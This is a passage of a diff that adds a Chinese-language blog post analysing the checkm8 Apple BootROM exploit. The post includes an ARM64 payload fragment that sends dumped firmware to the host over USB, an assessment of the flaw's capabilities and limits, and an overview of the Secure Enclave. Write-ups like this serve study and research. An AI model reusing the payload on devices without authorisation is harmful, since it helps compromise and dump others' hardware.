+<span class="n">LDR</span>  <span class="n">X8</span><span class="p">,</span> <span class="o">=</span><span class="n">DONE_MAGIC</span>
+<span class="n">STR</span>  <span class="n">X8</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>               <span class="p">;</span> <span class="err">消息头部加上</span><span class="n">DONE</span><span class="err">标识</span>
+<span class="n">B</span>    <span class="n">request_done</span>            <span class="p">;</span> <span class="err">加入传输队列</span>
+</code></pre></div></div>
+
+<p>最后调用usb_core_do_transfer(EP0_IN, 0x1800B0000, wLength, 0)创建一个IO任务加入EP0_IN端点的任务队列中，把获取到的固件发送给主机。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">request_done:</span>
+  <span class="n">MOV</span>  <span class="n">W0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x80</span>            <span class="p">;</span> <span class="n">EP0_IN</span>
+  <span class="n">MOV</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X20</span>              <span class="p">;</span> <span class="n">LOAD_ADDRESS</span> <span class="mh">0x1800B0000</span>
+  <span class="n">LDRH</span> <span class="n">W2</span><span class="p">,</span> <span class="p">[</span><span class="n">X19</span><span class="p">,</span><span class="err">#</span><span class="mi">6</span><span class="p">]</span>         <span class="p">;</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">wLength</span>
+  <span class="n">MOV</span>  <span class="n">X3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>               <span class="p">;</span> <span class="mi">0</span>
+  <span class="n">LDR</span>  <span class="n">X4</span><span class="p">,</span> <span class="o">=</span><span class="n">USB_CORE_DO_IO</span>  <span class="p">;</span> <span class="n">usb_core_do_transfer</span>
+  <span class="n">BLR</span>  <span class="n">X4</span>
+
+  <span class="n">MOV</span>  <span class="n">W0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+  <span class="n">LDP</span>  <span class="n">X20</span><span class="p">,</span> <span class="n">X19</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span>
+  <span class="n">LDP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span>
+  <span class="n">RET</span>
+</code></pre></div></div>
+
+<h1 id="事件回顾">事件回顾</h1>
+
+<h2 id="checkm8能力及威胁评估">checkm8<strong>能力及威胁评估</strong></h2>
+
+<ul>
+  <li>漏洞具备的能力
+    <ul>
+      <li>checkm8位于BootROM中，不可被修复</li>
+      <li>在BootROM中具备任意代码执行能力，提供了越狱的能力</li>
+      <li>开启CPU的JTAG调试功能，使研究人员可以对苹果设备进行更加深入的研究</li>
+      <li>控制iBoot的解密过程，从内存中提取解密后的iBoot</li>
+      <li>硬件漏洞的生命周期很长，是当前越狱老版本苹果设备的主要办法，如果是软件漏洞可能几天就被补上了</li>
+    </ul>
+  </li>
+  <li>漏洞的局限性
+    <ul>
+      <li>需要使用USB物理访问手机，无法远程执行</li>
+      <li>只能在手机引导时进行操作，仅存在于运行时内存，重启后恢复原样</li>
+      <li>ipwndfu集成的checkm8目前只是漏洞利用工具，并不具备越狱功能</li>
+      <li>无法突破用户数据的加密保护，文件系统、用户数据和生物ID被Secure Enclave加密保护</li>
+    </ul>
+  </li>
+</ul>
+
+<p>iPhone安全性的一些小知识：</p>
+
+<p><strong>SEP</strong>（Secure Enclave Processor，安全区域处理器）是iPhone和其他苹果设备中的一个独立硬件安全模块，专门用于处理和保护敏感数据。它是苹果设备安全架构的核心组成部分，与A系列芯片紧密结合。</p>
+
+<p><strong>SEP的作用：</strong></p>
+
+<ol>
+  <li><strong>存储和处理敏感数据</strong>：
+    <ul>
+      <li><strong>生物识别数据</strong>：如Touch ID的指纹信息和Face ID的面容信息。</li>
+      <li><strong>支付信息</strong>：如Apple Pay的支付令牌和加密密钥。</li>
+      <li><strong>密码和密钥</strong>：如设备解锁密码、文件加密密钥等。</li>
+    </ul>
+  </li>
+  <li><strong>加密和安全操作</strong>：
+    <ul>
+      <li>生成和存储设备唯一的加密密钥（基于UID）。</li>
+      <li>执行加密和解密操作，确保数据在传输和存储过程中的安全性。</li>
+      <li>管理设备的激活锁（Activation Lock）和查找我的iPhone（Find My iPhone）功能。</li>
+    </ul>
+  </li>
+  <li><strong>隔离和保护</strong>：
+    <ul>
+      <li>SEP是一个独立的协处理器，与主处理器（CPU）隔离，确保即使主系统被攻破，SEP中的数据仍然安全。</li>
+      <li>它有自己的安全启动过程和固件，防止未经授权的访问。</li>
+    </ul>
+  </li>
+  <li><strong>验证和认证</strong>：
+    <ul>
+      <li>验证Touch ID和Face ID的合法性，确保只有授权用户可以访问设备。</li>
+      <li>在Apple Pay交易中，验证支付请求的合法性并生成动态安全码。</li>
+    </ul>
+  </li>
+</ol>
+
+<p><strong>SEP的工作原理</strong></p>
+
+<ol>
+  <li><strong>硬件隔离</strong>：
+    <ul>
+      <li>SEP是一个独立的硬件模块，集成在A系列芯片中。</li>
+      <li>它与主处理器通过加密通道通信，确保数据在传输过程中不被窃取或篡改。</li>
+    </ul>
+  </li>
+  <li><strong>唯一密钥（UID）</strong>：
+    <ul>
+      <li>每个SEP都有一个基于设备UID的唯一加密密钥。</li>
+      <li>这些密钥用于加密和解密SEP中的数据，且无法被导出或复制。</li>
+    </ul>
+  </li>
+  <li><strong>安全启动</strong>：
+    <ul>
+      <li>SEP有自己的安全启动过程，确保其固件未被篡改。</li>
+      <li>只有在验证固件签名后，SEP才会启动。</li>
+    </ul>
+  </li>
+  <li><strong>防暴力破解</strong>：
+    <ul>
+      <li>SEP具有防暴力破解机制，例如在多次错误的指纹或面容识别尝试后，会锁定生物识别功能。</li>
+      <li>它还支持延迟响应和擦除数据功能，进一步增强安全性。</li>
+    </ul>
+  </li>
+</ol>
+
+<p><strong>SEP的应用场景</strong></p>
+
+<ol>
+  <li><strong>Touch ID和Face ID</strong>：
+    <ul>
+      <li>SEP存储和处理生物识别数据，确保这些数据不会被泄露或滥用。</li>
+      <li>它还会验证生物识别的合法性，防止伪造或欺骗。</li>
+    </ul>
+  </li>
+  <li><strong>Apple Pay</strong>：
+    <ul>
+      <li>SEP生成和管理支付令牌，确保支付过程的安全性。</li>
+      <li>它还会验证支付请求的合法性，并生成动态安全码。</li>
+    </ul>
+  </li>
+  <li><strong>设备加密</strong>：
+    <ul>
+      <li>SEP管理设备文件系统的加密密钥，确保用户数据在设备丢失或被盗时不会被访问。</li>
+    </ul>
+  </li>
+  <li><strong>激活锁和查找我的iPhone</strong>：
+    <ul>
+      <li>SEP与设备的激活锁绑定，确保即使设备被擦除，也无法绕过Apple ID激活。</li>
+    </ul>
+  </li>
+</ol>
+
+<p><strong>SEP的安全性</strong></p>
+
+<ol>
+  <li><strong>硬件级保护</strong>：
+    <ul>
+      <li>SEP是一个独立的硬件模块，与主系统隔离，防止软件攻击。</li>
+    </ul>
+  </li>
+  <li><strong>加密通信</strong>：
+    <ul>
+      <li>所有与SEP的通信都经过加密，防止数据被窃取或篡改。</li>
+    </ul>
+  </li>
+  <li><strong>防物理攻击</strong>：
+    <ul>
+      <li>SEP的设计考虑了物理攻击的防护，例如侧信道攻击和硬件拆解。</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<p><a href="https://support.apple.com/zh-cn/guide/security/sec59b0b31ff/web">安全隔区</a></p>
+
+<h2 id="事件后续">事件后续</h2>
+
+<ul>
+  <li>苹果官方处理</li>
+</ul>
+
+<p>迅速采取法律手段，要求GitHub和其他平台删除泄漏的源码。</p>
+
+<p>要求相关方遵守《数字千年版权法案》（<a href="https://zh.wikipedia.org/zh-cn/%E6%95%B8%E5%AD%97%E5%8D%83%E5%B9%B4%E7%89%88%E6%AC%8A%E6%B3%95">DMCA</a>）</p>
+
+<ul>
+  <li>
+    <p>后续有人申请了漏洞编号<a href="https://www.kb.cert.org/vuls/id/941987/">CVE-2019-8900</a></p>
+  </li>
+  <li>
+    <p>事了拂衣去，深藏功与名</p>
+  </li>
+</ul>
+
+<p>各国情报部门、军队、安全研究人员、果粉、越狱爱好者和吃瓜群众的狂欢</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/EG91kipUEAAtlh4.jpeg" alt="EG91kipUEAAtlh4.jpeg" /></p>
+
+<h1 id="固件分析方法">固件分析方法</h1>
+
+<h2 id="加载地址的恢复">加载地址的恢复</h2>
+
+<h2 id="ida分析过程">IDA分析过程</h2>
+
+<ol>
+  <li>
+    <p>新建内存段</p>
+  </li>
+  <li>
+    <p>添加结构体</p>
+  </li>
+  <li>
+    <p>对象的恢复</p>
+  </li>
+</ol>
+
+<h3 id="参数的修改">参数的修改</h3>
+
+<h1 id="参考资料">参考资料</h1>
+
+<p><a href="https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/">Checkm8 漏洞研究</a></p>
+
+<p><a href="https://habr.com/en/companies/dsec/articles/472762/">Technical analysis of the checkm8 exploit</a></p>
+
+<p><a href="https://alfiecg.uk/2023/07/21/A-comprehensive-write-up-of-the-checkm8-BootROM-exploit.html#usb-initialisation">A comprehensive write-up of the checkm8 BootROM exploit</a></p>
+
+<p><a href="https://axleos.com/exploiting-the-iphone-4-part-1-gaining-entry/">Exploiting the iPhone 4, Part 1: Gaining Entry</a></p>
+
+<p><a href="https://re.alisa.sh/notes/iBoot-heap-internals.html">iBoot堆结构</a></p>
+
+<p><a href="https://re.alisa.sh/notes/iBoot-address-space.html">iBoot地址空间</a></p>
+
+<p><a href="https://newosxbook.com/home.html">*OS Internals: - Welcome! 这个论坛介绍了很多iOS知识👍</a></p>
+
+<p><a href="https://www.theiphonewiki.com/">iPhone Wiki 这里面包含了很多漏洞利用知识和代码</a></p>
+
+<p><a href="https://www.usbzh.com/">USB中文网</a></p>
+
+<h1 id="附件">附件</h1>
+
+<p><a href="%E5%A0%86%E6%A8%A1%E6%8B%9F%E5%99%A8.zip">堆模拟器.zip</a></p>
+
+<p><a href="uEmu-master.zip">uEmu-master.zip</a></p>
+
+    </div>
+</article>
+
+                
+                <footer class="footer">
+        <section class="footer__about">
+                <p class="footer__about__copyright">© qts588 2025</p>
+                
+                <span class="divider">·</span>
+                
+                <span class="footer__about__theme"><p>theme</p><a id="simplex-logo" href="https://github.com/andreondra/jekyll-theme-simplex" target="_blank"><img alt="Simplex theme logo" src="http://localhost:4000/assets/img/icons/simplex_logo.svg"/></a><p>by <a href="https://ondrej.golasowski.com/">golas</a></p></span>
+        </section>
+</footer>
+
+                <script src="http://localhost:4000/assets/js/jquery.slim.min.js"></script>
+<script src="http://localhost:4000/assets/js/lity.min.js"></script>
+<script src="http://localhost:4000/assets/js/tools.js"></script>
+<script src="http://localhost:4000/assets/js/pic.js"></script>
+<script src="http://localhost:4000/assets/js/toc-highlight.js"></script>
+            </main>
+        </div>
+    
+</body>
+</html>
